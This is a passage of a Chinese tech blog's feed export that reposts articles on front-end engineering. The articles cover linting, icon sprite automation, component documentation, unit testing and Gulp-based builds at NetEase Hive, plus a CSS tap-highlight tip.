0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>以前的编码规范仅是口头约束+书面文档+CodeReview，约束力不强。今年引入了ESLint进行强制性约束。</p>
<p>我们的配置策略如下：</p>
<ol>
<li>花一天时间先遍历ESLint的437条规则；</li>
<li>筛选需要的规则，并在组内讨论；</li>
<li>先将确定的规则全部配error，然后再根据情况降级（因为往往配了warning，大家就不太care了）；</li>
<li>lint存在error时禁止提交代码。</li>
</ol>
<p>虽然初期配置ESLint的时间成本较高，但从长远看，ESLint能大大提高代码质量，提升协作效率。所以之后打算给CSS也配上Lint。</p>
<p><strong>技术选型：ESLint</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p><strong>自动化</strong></p>
<p>“现代工业其所以区别于工场手工业，是由于机器起了主要的作用。”</p>
<p>自动化是“手工工场”和“工业革命”的分水岭。（仅作比喻，与历史无关）</p>
<p><strong>图标合并</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>以前在蜂巢项目中，雪碧图是用PS手动拼的，字体图标是用icomoon手动生成的，然后再将导出的文件手动拷到项目中的。这是典型的手工工场生产方式。</p>
<p>这种方式存在以下问题：</p>
<ul>
<li>PS和icomoon谁管理比较好，前端还是视觉？</li>
<li>想知道图标对应哪个className，每次都要在源码中找一遍；</li>
<li>多人同时编辑二进制文件，会产生git冲突；</li>
<li>产品迭代迅速，遗留许多旧图标不敢删除。</li>
</ul>
<p>如今在项目中引入了SpriteSmith和FontCustom两个Gulp插件，让图标能够自动合并，解决了以上所有问题，步入了工业化生产。</p>
<p>视觉只需提供svg和png图标源文件，前端按照想要的className命名，放入icons目录中即可使用。其实这也相当于是图片资源的模块化。</p>
<p><strong>技术选型：SpriteSmith + FontCustom</strong></p>
<p><strong>可视化组件文档</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>前端开发和后端开发不同的是，前端开发是可视化的。</p>
<p>后端文档只要写个markdown文件，放在git仓库就能阅读；而在前端文档中，你写个m-modal-lg，别的开发者根本不知道你这个模态框多大，是个什么样子，去翻源码也无法感知组件的具体使用场景。</p>
<p>因此在前端工程中书写可视化的组件文档，也是很有必要的。</p>
<p>但这种高科技文档必然要插入CSS和JS，如果手工写肯定工作量很大，一是在迅速的产品迭代中来不及，二是会降低大家写文档的积极性。</p>
<p>对此，我们做了两项工作：</p>
<ol>
<li>写了一个PostMark插件，在markdown的基础上，将代码块中的Regular组件示例代码同步转换成JavaScript代码，使组件能够在最终的文档中活灵活现；</li>
<li>将组件JS文件中JSDoc风格的注释提取出来，转换成文档的API部分，插入到文档最后。</li>
</ol>
<p>剩下的书写工作就很简单：前端工程师只要在每个组件的demo文件夹中创建md文件，并书写文档内容和组件示例，在组件JS文件中书写API，就能自动生成相应文档。生成效果类似Regular UI文档（<a href="https://regular-ui.github.io/jsunit/dropdown.html）。" target="_blank" rel="external">https://regular-ui.github.io/jsunit/dropdown.html）。</a></p>
<p><strong>技术选型：PostMark + JSDoc</strong></p>
<p><strong>前端自动化测试</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>前端自动化测试能够保证代码质量、减少人肉测试、提高团队开发水平，这些优点是不言而喻的。</p>
<p>但它配置比较复杂，UI测试成本很高，很多团队对其望而却步。</p>
<p>由于产品迭代迅速，我们遵循<strong>维护自动化测试成本最低</strong>原则，在项目中只覆盖：</p>
<ul>
<li>基础类库的单元测试；</li>
<li>通用组件和通用业务组件的单元测试；</li>
<li>通用组件和通用业务组件简单的UI测试。</li>
</ul>
<p>由于RegularJS的MVVM特性，大部分组件的UI测试可以省略，因此这部分工作主要以给Regular UI和Cloud UI两个组件库加单元测试为主。</p>
<p>市面上前端测试框架有很多，选择哪个都不会有太大问题，最重要的是你要开始做，QA一定很开心。</p>
<p><strong>技术选型：Karma + Mocha + Expect.js</strong></p>
<p><strong>构建工具</strong></p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkJDQzA1MTVGNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkJDQzA1MTYwNkE2MjExRTRBRjEzODVCM0Q0NEVFMjFBIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6QkNDMDUxNUQ2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6QkNDMDUxNUU2QTYyMTFFNEFGMTM4NUIzRDQ0RUUyMUEiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6p+a6fAAAAD0lEQVR42mJ89/Y1QIABAAWXAsgVS/hWAAAAAElFTkSuQmCC" alt="img"></p>
<p>以上几点都是单项工作的自动化，要让它们相互衔接，实现整套工作的自动化，还需要一套完整的构建体系。</p>
<p>目前Gulp是处理工作流的最佳选择。</p>
<p><strong>技术选型：Gulp</strong></p>
<p>由于蜂巢产品下有多个系统，如果每个系统都搭一套gulp+webpack+babel+…，就不能保证几个平台的统一性，而且维护起来成本较高，是得不偿失的。因此实现一套独立于项目的构建工具是最好的解决方案。</p>
<p>我把本文中描述的这种工业化前端架构称为Pursuit架构（<a href="https://github.com/rainfore/pursuit），PURSUIT是多个技术栈单词的合并：webPack" target="_blank" rel="external">https://github.com/rainfore/pursuit），PURSUIT是多个技术栈单词的合并：webPack</a> + gUlp + Regular + mcsS + rgUI + eslinT，中文意思是追求，意味着不断追求前端技术、紧跟时代发展潮流。</p>
<p>然后按照这套架构实现了对应的构建工具pursuit-cli（<a href="https://github.com/rainfore/pursuit-cli），目前已在蜂巢产品下的各个系统中使用。" target="_blank" rel="external">https://github.com/rainfore/pursuit-cli），目前已在蜂巢产品下的各个系统中使用。</a></p>
<p>最后，整套Pursuit架构的工作流程如下：</p>
<p><img src="http://mmbiz.qpic.cn/mmbiz_png/0tqmmR6jQOTl4C0cbSyMxtwvH8dA90o3mSbwlMEmjhFxeWNGI6tHcy2BBD2oqKq1tPHE9icH14jubfyajvOGEAg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="img"></p>
<p>图5 工作流程图</p>
<ul>
<li>使用gulp作为基本工作流；</li>
<li>使用webpack+babel编译打包，再用uglify压缩js；</li>
<li>使用mcss预处理css，再用minify压缩css；</li>
<li>使用spritesmith生成雪碧图，再用imagemin压缩png；</li>
<li>使用fontcustom生成字体图标；</li>
<li>使用eslint规范编码格式，并自动fix；</li>
<li>使用karma+mocha进行自动化测试，并输出测试报告；</li>
<li>使用postmark+jsdoc生成可视化组件文档。</li>
</ul>
<p><img src="http://mmbiz.qpic.cn/mmbiz_png/0tqmmR6jQOTl4C0cbSyMxtwvH8dA90o3bpvoP2l17DW3trJc8hhqdlNBicnibxU8YqrFcFpL07BpsBL4nqSK0y2w/0?wx_fmt=gif&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="img"></p>
<p><strong>其他</strong></p>
<p>至于性能优化、项目部署、数据统计等其他前端架构问题，解决完本文中提到的四大方面问题之后可以很好处理。且与前工业化架构的解决方法相同，这次蜂巢架构没有做相关调整，因此本文不再介绍。</p>
<p><strong>——赵雨森</strong></p>
<p><strong>网易杭州研究院云计算平台产品部前端组</strong></p>
<p><img src="http://mmbiz.qpic.cn/mmbiz_png/0tqmmR6jQOTl4C0cbSyMxtwvH8dA90o3aicmibTRTpk9JG9eROrnmn7yTicELR8oHFic4qUyhADZIfdjDdlcjtxmZg/0?wx_fmt=gif&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1" alt="img"></p>
<p>点击链接阅读“杭研技术秀”系列文章：</p>
<p><a href="http://mp.weixin.qq.com/s?__biz=MzI2MzM3MzkyMg==&amp;mid=2247483978&amp;idx=1&amp;sn=2b408c752f5b2103a8a14a42ed0251c4&amp;chksm=eabd9747ddca1e51f48f7a50101658caad09e2fd9524d3b3e05348dad39393009bfba3cdeb08&amp;scene=21#wechat_redirect" target="_blank" rel="external">十年•杭研技术秀|图说subrequest之并发使用原理；</a></p>
<p><a href="http://mp.weixin.qq.com/s?__biz=MzI2MzM3MzkyMg==&amp;mid=2247483933&amp;idx=1&amp;sn=b3736ac79ae55d3831d5c289c5326374&amp;chksm=eabd9710ddca1e06e379fd6e7cdb828a578e86849e3d6f533bf69144ab80b87b1e47fb5ef9d6&amp;scene=21#wechat_redirect" target="_blank" rel="external">十年•杭研技术秀|构建高可用的PB级对象存储；</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;十年•杭研技术秀-网易蜂巢的工业化前端架构&quot;&gt;&lt;a href=&quot;#十年•杭研技术秀-网易蜂巢的工业化前端架构&quot; class=&quot;headerlink&quot; title=&quot;十年•杭研技术秀 | 网易蜂巢的工业化前端架构&quot;&gt;&lt;/a&gt;十年•杭研技术秀 | 网易蜂巢的工业化前端
    
    </summary>
    
      <category term="web" scheme="http://www.wanglinzhizhi.me/categories/web/"/>
    
    
      <category term="架构" scheme="http://www.wanglinzhizhi.me/tags/%E6%9E%B6%E6%9E%84/"/>
    
      <category term="体系架构" scheme="http://www.wanglinzhizhi.me/tags/%E4%BD%93%E7%B3%BB%E6%9E%B6%E6%9E%84/"/>
    
      <category term="Web 架构" scheme="http://www.wanglinzhizhi.me/tags/Web-%E6%9E%B6%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>轻击的时候不显示默认的atived  状态</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E8%BD%BB%E5%87%BB%E7%9A%84%E6%97%B6%E5%80%99%E4%B8%8D%E6%98%BE%E7%A4%BA%E9%BB%98%E8%AE%A4%E7%9A%84atived%20%20%E7%8A%B6%E6%80%81/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/轻击的时候不显示默认的atived  状态/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="轻击的时候不显示默认的atived-状态"><a href="#轻击的时候不显示默认的atived-状态" class="headerlink" title="轻击的时候不显示默认的atived  状态"></a>轻击的时候不显示默认的atived  状态</h2><p>-webkit-tap-highlight-color </p>
<figure class="highlight css"><table><tr><td class="code"><pre><div class="line"><span class="selector-tag">-webkit-tap-highlight-color</span>: <span class="selector-tag">rgba</span>(0,0,0,0);</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;轻击的时候不显示默认的atived-状态&quot;&gt;&lt;a href=&quot;#轻击的时候不显示默认的atived-状态&quot; class=&quot;headerlink&quot; title=&quot;轻击的时候不显示默认的atived  状态&quot;&gt;&lt;/a&gt;轻击的时候不显示默认的atived  状态&lt;/h2
    
    </summary>
    
      <category term="移动web" scheme="http://www.wanglinzhizhi.me/categories/%E7%A7%BB%E5%8A%A8web/"/>
    
    
      <category term="CSS3" scheme="http://www.wanglinzhizhi.me/tags/CSS3/"/>
    
  </entry>
  
  <entry>
    <title>谁能介绍下web前端工程化</title>
    <link href="http://www.wanglinzhizhi.me/2017/01/21/%E8%B0%81%E8%83%BD%E4%BB%8B%E7%BB%8D%E4%B8%8Bweb%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%EF%BC%9F/"/>
    <id>http://www.wanglinzhizhi.me/2017/01/21/谁能介绍下web前端工程化？/</id>
    <published>2017-01-21T10:51:18.000Z</published>
    <updated>2017-01-21T10:51:18.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="谁能介绍下web前端工程化？"><a href="#谁能介绍下web前端工程化？" class="headerlink" title="谁能介绍下web前端工程化？"></a><a href="https://www.zhihu.com/question/24558375" target="_blank" rel="external">谁能介绍下web前端工程化？</a></h2><p>作者：赵雨森<br>链接：<a href="https://www.zhihu.com/question/24558375/answer/139920107" target="_blank" rel="external">https://www.zhihu.com/question/24558375/answer/139920107</a><br>来源：知乎</p>
<p>目前来说，Web业务日益复杂化和多元化，前端开发已经由以WebPage模式为主转变为以WebApp模式为主了。现在随便找个前端项目，都已经不是过去的拼个页面+搞几个jQuery插件就能完成的了。工程复杂了就会产生许多问题，比如：如何进行高效的多人协作？如何保证项目的可维护性？如何提高项目的开发质量？…</p>
<p>前端工程化是前端架构中重要的一环，就是为了解决上述各种效率方面的问题的。而前端工程本质上是软件工程的一种，因此我们应该从软件工程的角度来研究前端工程。</p>
<p>那么前端工程化需要考虑哪些因素？<br>我认为前端工程化主要应该从<code>模块化</code>、<code>组件化</code>、<code>规范化</code>、<code>自动化</code> 四个方面来思考，下面一一展开。</p>
<h2 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h2><p>简单来说，模块化就是将一个大文件拆分成相互依赖的小文件，再进行统一的拼装和加载。只有这样，才有多人协作的可能。</p>
<h3 id="JS的模块化"><a href="#JS的模块化" class="headerlink" title="JS的模块化"></a>JS的模块化</h3><p>在ES6之前，JavaScript一直没有模块系统，这对开发大型复杂的前端工程造成了巨大的障碍。对此社区制定了一些模块加载方案，如CommonJS、AMD和CMD等，某些框架也会有自己模块系统，比如Angular1.x。</p>
<p>现在ES6已经在语言层面上规定了模块系统，完全可以取代现有的CommonJS和AMD规范，而且使用起来相当简洁，并且有静态加载的特性。</p>
<p>规范确定了，然后就是模块的打包和加载问题：</p>
<ol>
<li>用Webpack+Babel将所有模块打包成一个文件同步加载；</li>
<li>用SystemJS+Babel分模块异步加载；</li>
<li>将两者结合在一起。</li>
</ol>
<h3 id="CSS的模块化"><a href="#CSS的模块化" class="headerlink" title="CSS的模块化"></a>CSS的模块化</h3><p>虽然SASS、LESS、Stylus等预处理器实现了CSS的文件拆分，但没有解决CSS模块化的一个重要问题：选择器的全局污染问题。</p>
<p>按道理，一个模块化的文件应该要隐藏内部作用域，只暴露少量接口给使用者。而按照目前预处理器的方式，导入一个CSS模块后，已存在的样式有被覆盖的风险。虽然重写样式是CSS的一个优势，但这并不利于多人协作。</p>
<p>为了避免全局选择器的冲突，各厂都制定了自己的CSS命名风格：<br>BEM风格；<br>Bootstrap风格；<br>Semantic UI风格；<br>我们公司的NEC风格；<br>…</p>
<p>但这毕竟是弱约束。选择器随着项目的增长变得越多越复杂，然后项目组里再来个新人带入自己的风格，就更加混乱了。</p>
<p>所以我很赞同这句话：<br>与其费尽心思地告诉别人要遵守某种规则，以规避某种痛苦，倒不如从工具层面就消灭这种痛苦。<br>从工具层面，社区又创造出Shadow DOM、CSS in JS和CSS Modules三种解决方案。</p>
<p>Shadow DOM是WebComponents的标准。它能解决全局污染问题，但目前很多浏览器不兼容，对我们来说还很久远；<br>CSS in JS是彻底抛弃CSS，使用JS或JSON来写样式。这种方法很激进，不能利用现有的CSS技术，而且处理伪类等问题比较困难；<br>CSS Modules仍然使用CSS，只是让JS来管理依赖。它能够最大化地结合CSS生态和JS模块化能力，目前来看是最好的解决方案。Vue的scoped style也属于这一种。</p>
<h2 id="组件化"><a href="#组件化" class="headerlink" title="组件化"></a>组件化</h2><p>首先，组件化≠模块化。好多人对这两个概念有些混淆。</p>
<p>模块化只是在语言层面上，对代码的拆分；而组件化是基于模块化，在设计层面上，对UI（用户界面）的拆分。</p>
<p>从UI拆分下来的每个包含模板(HTML)+样式(CSS)+逻辑(JS)功能完备的结构单元，我们称之为组件。</p>
<p>其实，组件化更重要的是一种分治思想。<br>Keep Simple. Everything can be a component.<br>这句话就是说页面上所有的东西都是组件。页面是个大型组件，可以拆成若干个中型组件，然后中型组件还可以再拆，拆成若干个小型组件，小型组件也可以再拆，直到拆成DOM元素为止。DOM元素可以看成是浏览器自身的组件，作为组件的基本单元。</p>
<p>传统前端框架/类库的思想是先组织DOM，然后把某些可复用的逻辑封装成组件来操作DOM，是DOM优先；而组件化框架/类库的思想是先来构思组件，然后用DOM这种基本单元结合相应逻辑来实现组件，是组件优先。这是两者本质的区别。</p>
<p>其次，组件化实际上是一种按照模板(HTML)+样式(CSS)+逻辑(JS)三位一体的形式对面向对象的进一步抽象。</p>
<p>所以我们除了封装组件本身，还要合理处理组件之间的关系，比如（逻辑）继承、（样式）扩展、（模板）嵌套和包含等，这些关系都可以归为依赖。</p>
<p>其实组件化不是什么新鲜的东西，以前的客户端框架，像WinForm、WPF、Android等，它们从诞生的那天起就是组件化的。而前端领域发展曲折，是从展示页面为主的WebPage模式走过来的，近两年才从客户端框架经验中引入了组件化思想。其实我们很多前端工程化的问题都可以从客户端那里寻求解决方案。</p>
<p>目前市面上的组件化框架很多，主要的有Vue、React、Angular 2、我们公司 @郑海波 的Regular、Avalon等。你感兴趣可以都研究一下，选择一套中意的。其实Vue文档中的对比其他框架一文已经讲得很详细了。</p>
<h2 id="规范化"><a href="#规范化" class="headerlink" title="规范化"></a>规范化</h2><p>模块化和组件化确定了开发模型，而这些东西的实现就需要规范去落实。<br>规范化其实是工程化中很重要的一个部分，项目初期规范制定的好坏会直接影响到后期的开发质量。</p>
<p>我能想到的有以下一些内容：<br>目录结构的制定<br>编码规范<br>前后端接口规范<br>文档规范<br>组件管理<br>Git分支管理<br>Commit描述规范<br>定期CodeReview<br>视觉图标规范<br>…</p>
<p>其中编码规范最好采取ESLint和StyleLint等强制措施，因为人是靠不住的，比如可以Lint通不过不能提交代码等。<br>前后端接口管理可以了解一下我们公司出的NEI - 接口管理平台。</p>
<h2 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h2><p>作了这么多年程序猿的我，一直秉持的一个理念是：<br>任何简单机械的重复劳动都应该让机器去完成。<br>所以我也认为，前端工程化的很多脏活累活都应该交给自动化工具来完成。</p>
<h3 id="图标合并"><a href="#图标合并" class="headerlink" title="图标合并"></a>图标合并</h3><p>不要再用PS拼雪碧图了，有Gulp+SpriteSmith；<br>不要再用Icomoon了，这仍然是半自动的，有FontCustom。</p>
